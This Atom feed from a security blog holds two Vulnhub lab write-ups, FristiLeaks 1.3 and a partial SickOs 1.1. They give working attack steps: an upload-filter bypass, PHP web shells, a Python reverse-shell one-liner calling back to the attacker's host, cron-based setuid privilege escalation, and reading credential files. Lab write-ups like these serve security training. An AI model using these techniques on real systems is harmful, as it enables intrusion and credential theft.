<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Vulnhub | 0x73696e65]]></title>
  <link href="http://73696e65.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-12-15T09:19:39+01:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[FristiLeaks: 1.3]]></title>
    <link href="http://73696e65.github.io/blog/2015/12/15/fristileaks-1-dot-3/"/>
    <updated>2015-12-15T08:45:49+01:00</updated>
    <id>http://73696e65.github.io/blog/2015/12/15/fristileaks-1-dot-3</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">FristiLeaks: 1.3</a></p>

<p>Nmap output:
{% codeblock %}
root@kali32:~$ sudo nmap 192.168.80.128 -sT -p-</p>

<p>Starting Nmap 7.00 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2015-12-14 23:16 CET
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 1055.59 seconds
{% endcodeblock %}</p>

<p>Only http port is open. There is a <code>robots.txt</code> file with the following content:</p>

<p>{% codeblock %}
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
{% endcodeblock %}</p>

<p>Nothing useful here, but our guess to try <code>/fristi</code> reveals in comment:</p>

<p>{% codeblock lang:html %}</p>

<!--
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
-->


<p>&hellip;
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==
{% endcodeblock %}</p>

<p>The first hint was about username, the second one contains base64 encoded <code>png</code>
file with the password. So we use them (<code>eezeepz / keKkeKKeKKeKkEkkEk</code>). Now we
need to evade the image upload filtering.</p>

<p>After trying different methods, finally we change for POST method the request for
double extensions:
{% codeblock lang:html %}
Content-Disposition: form-data; name=&ldquo;fileToUpload&rdquo;; filename=&ldquo;test.php.gif&rdquo;</p>

<p>&hellip;
<html>
<body>
Uploading, please wait<br />The file has been uploaded to /uploads <br /></body>
</html>
{% endcodeblock %}</p>

<p>The file that we uploaded was generated using <code>weevely</code> and after connecting:</p>

<p>{% codeblock %}
root@kali32:~$ weevely generate 1234 /tmp/test.php.gif</p>

<p>root@kali32:~$ weevely <a href="http://192.168.80.128/fristi/uploads/test.php.gif">http://192.168.80.128/fristi/uploads/test.php.gif</a> 1234 id
uid=48(apache) gid=48(apache) groups=48(apache)</p>

<p>root@kali32:~$ weevely <a href="http://192.168.80.128/fristi/uploads/test.php.gif">http://192.168.80.128/fristi/uploads/test.php.gif</a> 1234
{% endcodeblock %}</p>

<p>We do a little investigation:
{% codeblock lang:php %}
localhost.localdomain:/var/www/html/fristi $ head checklogin.php
&lt;?php</p>

<p>ob_start();
$host=&ldquo;localhost&rdquo;; // Host name
$username=&ldquo;eezeepz&rdquo;; // Mysql username
$password=&ldquo;4ll3maal12#&rdquo;; // Mysql password
$db_name=&ldquo;hackmenow&rdquo;; // Database name
$tbl_name=&ldquo;members&rdquo;; // Table name</p>

<p>// Connect to server and select databse.
{% endcodeblock %}</p>

<p>{% codeblock %}
localhost.localdomain:/var/www/html/fristi/uploads $ :audit_etcpasswd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
<a href="ftp:x:14:50:FTP">ftp:x:14:50:FTP</a> User:/var/<a href="ftp:/sbin/nologin">ftp:/sbin/nologin</a>
nobody:x:99:99:Nobody:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
saslauth:x:499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
vboxadd:x:498:1::/var/run/vboxadd:/bin/false
eezeepz:x:500:500::/home/eezeepz:/bin/bash
admin:x:501:501::/home/admin:/bin/bash
fristigod:x:502:502::/var/fristigod:/bin/bash
fristi:x:503:100::/var/www:/sbin/nologin
{% endcodeblock %}</p>

<p>{% codeblock %}
localhost.localdomain:/var/www/html/fristi/uploads $ :audit_suidsgid /
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
| /bin/mount                       |
| /bin/fusermount                  |
| /bin/umount                      |
| /bin/su                          |
| /bin/ping                        |
| /bin/ping6                       |
| /sbin/netreport                  |
| /sbin/pam_timestamp_check        |
| /sbin/unix_chkpwd                |
| /usr/bin/crontab                 |
| /usr/bin/chsh                    |
| /usr/bin/sudo                    |
| /usr/bin/chfn                    |
| /usr/bin/write                   |
| /usr/bin/newgrp                  |
| /usr/bin/ssh-agent               |
| /usr/bin/chage                   |
| /usr/bin/gpasswd                 |
| /usr/bin/passwd                  |
| /usr/bin/wall                    |
| /usr/libexec/utempter/utempter   |
| /usr/libexec/openssh/ssh-keysign |
| /usr/libexec/pt_chown            |
| /usr/sbin/suexec                 |
| /usr/sbin/postqueue              |
| /usr/sbin/usernetctl             |
| /usr/sbin/postdrop               |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
{% endcodeblock %}</p>

<p>We use another python backdoor as reverse shell to redirect tty in python:
{% codeblock %}
root@kali32:~$ nc -l -p 1337</p>

<p>weevely> python -c &ldquo;import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(&lsquo;/bin/bash&rsquo;)&rdquo; 192.168.80.137 1337
{% endcodeblock %}</p>

<p>In the home directory of <code>eezeepz</code> user, there is <code>notes.txt</code> file with the instruction for cron:
{% codeblock %}
bash-4.1$ cat /home/eezeepz/notes.txt
cat /home/eezeepz/notes.txt
Yo EZ,</p>

<p>I made it possible for you to do some automated checks,
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/</p>

<p>Don&rsquo;t forget to specify the full path for each binary!</p>

<p>Just put a file called &ldquo;runthis&rdquo; in /tmp/, each line one command. The
output goes to the file &ldquo;cronresult&rdquo; in /tmp/. It should
run every minute with my account privileges.</p>

<ul>
<li>Jerry
{% endcodeblock %}</li>
</ul>


<p>The escalation process is straightforward, we inject our code to execute shell
and set suid permission using admin&rsquo;s account:</p>

<p>{% codeblock %}
bash-4.1$ echo &lsquo;#include &lt;stdio.h></p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main()
{
   setreuid(geteuid(),geteuid());
   execve(&ldquo;/bin/sh&rdquo;, NULL, NULL);</p>

<p>   return 0;
}
&lsquo; > /tmp/run.cecho &rsquo;#include &lt;stdio.h></p>

<blockquote><h1>include &lt;stdlib.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main()
{
   setreuid(geteuid(),geteuid());
   execve(&ldquo;/bin/sh&rdquo;, NULL, NULL);</p>

<p>   return 0;
}</p>

<p>&lsquo; > /tmp/run.c
{% endcodeblock %}</p></blockquote>

<p>{% codeblock %}
bash-4.1$ gcc run.c -o run
gcc run.c -o run</p>

<p>bash-4.1$ echo &ldquo;/home/admin/cat /tmp/run > /tmp/run-admin&rdquo; > /tmp/runthis
bash-4.1$ echo &ldquo;/home/admin/chmod a+xs /tmp/run-admin&rdquo; >> /tmp/runthis</p>

<p>{% endcodeblock %}</p>

<p>After the few seconds of waiting, we are <code>admin</code>:
{% codeblock %}
bash-4.1$ ./run-admin
./run-admin
bash-4.1$ id
id
uid=501(admin) gid=48(apache) groups=48(apache)</p>

<p>{% endcodeblock %}</p>

<p>We do some recon in admin directory, there is obfuscated password and encoding routine:</p>

<p>{% codeblock %}
bash-4.1$ cat whoisyourgodnow.txt
cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG
{% endcodeblock %}</p>

<p>{% codeblock lang:python %}
bash-4.1$ cat cryptpass.py
cat cryptpass.py</p>

<h1>Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn</h1>

<p>import base64,codecs,sys</p>

<p>def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], &lsquo;rot13&rsquo;)</p>

<p>cryptoResult=encodeString(sys.argv[1])
print cryptoResult
{% endcodeblock %}</p>

<p>So the password is at first base64 encoded, then reversed and shifted using rot13. We reverse the process in python:</p>

<p>{% codeblock lang:python %}
import base64,codecs,sys
base64.b64decode( codecs.encode(&lsquo;=RFn0AKnlMHMPIzpyuTI0ITG&rsquo;, &lsquo;rot13&rsquo;)[::-1] )
&lsquo;LetThereBeFristi!&rsquo;
{% endcodeblock %}</p>

<p>We found the password for <code>fristigod</code> user:</p>

<p>{% codeblock %}
bash-4.1$ su fristigod
su fristigod
Password: LetThereBeFristi!</p>

<p>bash-4.1$ id
id
uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)
{% endcodeblock %}</p>

<p>In his directory, there is a binary with the user authorization and
<code>.bash_history</code> file, we use <code>sudo</code> the same way as previously invoked according the history file:</p>

<p>{% codeblock %}
bash-4.1$ cat .bash_history
cat .bash_history
ls
pwd
ls -lah
cd .secret_admin_stuff/
ls
./doCom
./doCom test
sudo ls
exit
cd .secret_admin_stuff/
ls
./doCom
sudo -u fristi ./doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
sudo /var/fristigod/.secret_admin_stuff/doCom
exit
sudo /var/fristigod/.secret_admin_stuff/doCom
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
groups
ls -lah
usermod -G fristigod fristi
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
less /var/log/secure e
Fexit
exit
exit</p>

<p>bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
[sudo] password for fristigod: LetThereBeFristi!</p>

<p>bin   dev  home  lib64       media  opt   root  selinux  sys  usr
boot  etc  lib   lost+found  mnt    proc  sbin  srv      tmp  var
bash-4.1$</p>

<p>bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)</p>

<p>bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom sh
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom sh
sh-4.1# id
id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)
{% endcodeblock %}</p>

<p>Finally the flag:
{% codeblock %}
sh-4.1# cat /root/fristileaks_secrets.txt
cat /root/fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA [<a href="https://tldr.nu">https://tldr.nu</a>]</p>

<p>I wonder if you beat it in the maximum 4 hours it&rsquo;s supposed to take!</p>

<p>Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)</p>

<p>Flag: Y0u_kn0w_y0u_l0ve_fr1st1
{% endcodeblock %}</p>

<p>Thanks for this challenge, it took me nearly 2 hours to finish.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SickOs: 1.1]]></title>
    <link href="http://73696e65.github.io/blog/2015/12/12/sickos-1-dot-1/"/>
    <updated>2015-12-12T11:21:39+01:00</updated>
    <id>http://73696e65.github.io/blog/2015/12/12/sickos-1-dot-1</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs: 1.1</a></p>

<p>Nmap output:
{% codeblock %}
root@kali32:~$ nmap 192.168.80.169
22/tcp   open   ssh
3128/tcp open   squid-http
8080/tcp closed http-proxy
{% endcodeblock %}</p>

<p>There is an open proxy, we try internal network reconnaissance:
{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 <a href="http://192.168.80.169">http://192.168.80.169</a></p>

<h1>
BLEHHH!!!
</h1>


<p>{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~$ dirb <a href="http://192.168.80.169:80">http://192.168.80.169:80</a> -p 192.168.80.169:3128
&hellip;
+ <a href="http://192.168.80.169:80/cgi-bin/">http://192.168.80.169:80/cgi-bin/</a> (CODE:403|SIZE:290)
+ <a href="http://192.168.80.169:80/connect">http://192.168.80.169:80/connect</a> (CODE:200|SIZE:109)
+ <a href="http://192.168.80.169:80/index">http://192.168.80.169:80/index</a> (CODE:200|SIZE:21)
+ <a href="http://192.168.80.169:80/index.php">http://192.168.80.169:80/index.php</a> (CODE:200|SIZE:21)
+ <a href="http://192.168.80.169:80/robots">http://192.168.80.169:80/robots</a> (CODE:200|SIZE:45)
+ <a href="http://192.168.80.169:80/robots.txt">http://192.168.80.169:80/robots.txt</a> (CODE:200|SIZE:45)
+ <a href="http://192.168.80.169:80/server-status">http://192.168.80.169:80/server-status</a> (CODE:403|SIZE:295)
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 <a href="http://192.168.80.169:80/robots.txt">http://192.168.80.169:80/robots.txt</a>
User-agent: *
Disallow: /
Dissalow: /wolfcms
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 <a href="http://192.168.80.169:80/connect">http://192.168.80.169:80/connect</a></p>

<h1>!/usr/bin/python</h1>

<p>print &ldquo;I Try to connect things very frequently\n&rdquo;
print &ldquo;You may want to try my services&rdquo;
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 <a href="http://192.168.80.169:80/wolfcms/">http://192.168.80.169:80/wolfcms/</a>
{% endcodeblock %}</p>

<p>We found the Wolf CMS and to have easier access, we set the HTTP proxy in
Firefox. After a little googling, we found this
<a href="https://www.exploit-db.com/exploits/36818/">exploit</a>, but it only uploads php
shell and we can do this manually. To use this technique, we need credentials to log in via
<a href="http://192.168.80.169/wolfcms/?/admin/">admin interface</a>. One of our first guesses was
<code>admin/admin</code>, so we upload the file with the following content for RCE:</p>

<p>{% codeblock lang:php %}
&lt;?php system($_REQUEST[cmd]); ?>
{% endcodeblock %}</p>

<p>As we can read in exploit, the uploaded files are available in <code>public</code> directory. Invoking a few commands:</p>

<p>{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 <a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la</a>
total 20
drwxrwxrwx 4 root     root     4096 Dec 12 12:25 .
drwxr-xr-x 5 root     root     4096 Dec  5 06:33 ..
-rw-r&ndash;r&ndash; 1 www-data www-data   32 Dec 12 12:29 a.php
drwxrwxrwx 2 root     root     4096 Dec  5 06:05 images
drwxrwxrwx 4 root     root     4096 Dec  5 06:05 themes
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+../">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+../</a>&rdquo;
total 52
drwxr-xr-x 5 root root 4096 Dec  5 06:33 .
drwxrwxrwx 3 root root 4096 Dec  6 21:15 ..
-rwxr-xr-x 1 root root  950 Dec  5 06:15 .htaccess
-rwxrwxrwx 1 root root 4084 Dec  5 06:15 CONTRIBUTING.md
-rwxrwxrwx 1 root root 2405 Dec  5 06:15 README.md
-rwxrwxrwx 1 root root  403 Dec  5 06:15 composer.json
-rwxrwxrwx 1 root root 3058 Dec  5 07:26 config.php
drwxrwxrwx 2 root root 4096 Dec  5 06:15 docs
-rwxrwxrwx 1 root root  894 Dec  5 06:15 favicon.ico
-rwxrwxrwx 1 root root 6815 Dec  5 06:32 index.php
drwxrwxrwx 4 root root 4096 Dec 12 12:25 public
-rwxrwxrwx 1 root root    0 Dec  5 06:15 robots.txt
drwxrwxrwx 7 root root 4096 Dec  5 06:25 wolf
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 <a href="http://192.168.80.169/wolfcms/public/a.php?cmd=netstat+-nalutp">http://192.168.80.169/wolfcms/public/a.php?cmd=netstat+-nalutp</a>
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:<em>               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:</em>               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:<em>               LISTEN      -
tcp        0      0 192.168.80.169:80       192.168.80.169:60664    TIME_WAIT   -
tcp        0      0 192.168.80.169:80       192.168.80.169:60665    TIME_WAIT   -
tcp        0      0 192.168.80.169:80       192.168.80.169:60667    ESTABLISHED -
tcp        0      0 192.168.80.169:80       192.168.80.169:60666    TIME_WAIT   -
tcp        1      0 192.168.80.169:80       192.168.80.169:60662    CLOSE_WAIT  -
tcp        1      0 192.168.80.169:80       192.168.80.169:60663    CLOSE_WAIT  -
tcp        1      0 192.168.80.169:80       192.168.80.169:60661    CLOSE_WAIT  -
tcp6       0      0 :::22                   :::</em>                    LISTEN      -
tcp6       0      0 :::3128                 :::<em>                    LISTEN      -
tcp6       0      0 192.168.80.169:60667    192.168.80.169:80       ESTABLISHED -
tcp6       0      0 192.168.80.169:3128     192.168.80.137:54390    ESTABLISHED -
udp        0      0 192.168.80.169:45534    192.168.80.2:53         ESTABLISHED 1703/netstat
udp        0      0 192.168.80.169:37938    192.168.80.2:53         ESTABLISHED 1701/netstat
udp        0      0 0.0.0.0:68              0.0.0.0:</em>                           -
udp        0      0 192.168.80.169:39007    192.168.80.2:53         ESTABLISHED 1705/netstat
udp        0      0 0.0.0.0:53488           0.0.0.0:*                           -
udp6       0      0 :::43051
{% endcodeblock %}</p>

<p>Here we found the database user credentials:
{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=cat+../config.php">http://192.168.80.169/wolfcms/public/a.php?cmd=cat+../config.php</a>&rdquo;
&lt;?php</p>

<p>// Database information:
// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
// The path can only be absolute path or :memory:
// For more info look at: www.php.net/pdo</p>

<p>// Database settings:
define(&lsquo;DB_DSN&rsquo;, &lsquo;mysql:dbname=wolf;host=localhost;port=3306&rsquo;);
define(&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);
define(&lsquo;DB_PASS&rsquo;, &lsquo;john@123&rsquo;);
define(&lsquo;TABLE_PREFIX&rsquo;, &lsquo;&rsquo;);
&hellip;
{% endcodeblock %}</p>

<p>Examining the MySQL database:</p>

<p>{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=echo+mysql+-uroot+-pjohn@123+-e+status">http://192.168.80.169/wolfcms/public/a.php?cmd=echo+mysql+-uroot+-pjohn@123+-e+status</a>&rdquo;
mysql -uroot -pjohn@123 -e status</p>

<h2>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e+status">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e+status</a>&rdquo;</h2>

<p>mysql  Ver 14.14 Distrib 5.5.46, for debian-linux-gnu (i686) using readline 6.2</p>

<p>Connection id:          149
Current database:
Current user:           root@localhost
SSL:                    Not in use
Current pager:          stdout
Using outfile:          &lsquo;&rsquo;
Using delimiter:        ;
Server version:         5.5.46-0ubuntu0.12.04.2 (Ubuntu)
Protocol version:       10
Connection:             Localhost via UNIX socket
Server characterset:    latin1
Db     characterset:    latin1
Client characterset:    latin1
Conn.  characterset:    latin1
UNIX socket:            /var/run/mysqld/mysqld.sock
Uptime:                 1 hour 1 min 49 sec</p>

<p>Threads: 1  Questions: 2646  Slow queries: 0  Opens: 64  Flush tables: 1  Open tables: 57  Queries per second avg: 0.713</p>

<p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e</a>&#8216;show+databases&#8217;&rdquo;
Database
information_schema
mysql
performance_schema
wolf
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e</a>&#8216;show+tables&#8217;&rdquo;
Tables_in_wolf
cron
layout
page
page_part
page_tag
permission
plugin_settings
role
role_permission
secure_token
setting
snippet
tag
user
user_role
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e</a>&#8216;select+*+from+user&#8217;&rdquo;
id      name    email   username        password        salt    language        last_login      last_failure    failure_count   created_on      updated_on created_by_id   updated_by_id
1       Administrator   <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x61;&#100;&#109;&#105;&#110;&#64;&#x79;&#x6f;&#117;&#114;&#x73;&#105;&#x74;&#101;&#x2e;&#99;&#x6f;&#109;">&#97;&#x64;&#x6d;&#x69;&#x6e;&#x40;&#121;&#111;&#117;&#x72;&#x73;&#x69;&#116;&#x65;&#46;&#99;&#x6f;&#109;</a>      admin   3a1be46a798dce0d880f633ce195b676839a0ce344c917a7ea1270816dcb649ce1e2b811b56fe93c9d3c4e679151180129ee9483ea39bff4d4578c4be6c77e1f   6806b774443f2c34231eceddf156a42d3c26a2b5219ee9d55f5e3c9aea534167        en      2015-12-12 12:23:33     NULL       0       2015-12-05 06:25:06     2015-12-12 12:23:33     1       NULL
{% endcodeblock %}</p>

<p>Nothing interesting here, there is only one user and we already know his password.</p>

<p>We noticed that the user <code>www-data</code> has shell access:
{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=cat+/etc/passwd">http://192.168.80.169/wolfcms/public/a.php?cmd=cat+/etc/passwd</a>&rdquo;
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
{% endcodeblock %}</p>

<p>Next idea is to upload ssh authorization key and log in via ssh.</p>

<p>{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=id">http://192.168.80.169/wolfcms/public/a.php?cmd=id</a>&rdquo;
uid=33(www-data) gid=33(www-data) groups=33(www-data)
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data</a>&rdquo;
total 24
drwxrwxrwx  3 root root 4096 Dec  6 21:15 .
drwxr-xr-x 13 root root 4096 Dec 12 11:55 ..
-rwxrwxrwx  1 root root  109 Dec  5 07:57 connect.py
-rw-r&ndash;r&ndash;  1 root root   21 Dec  5 06:05 index.php
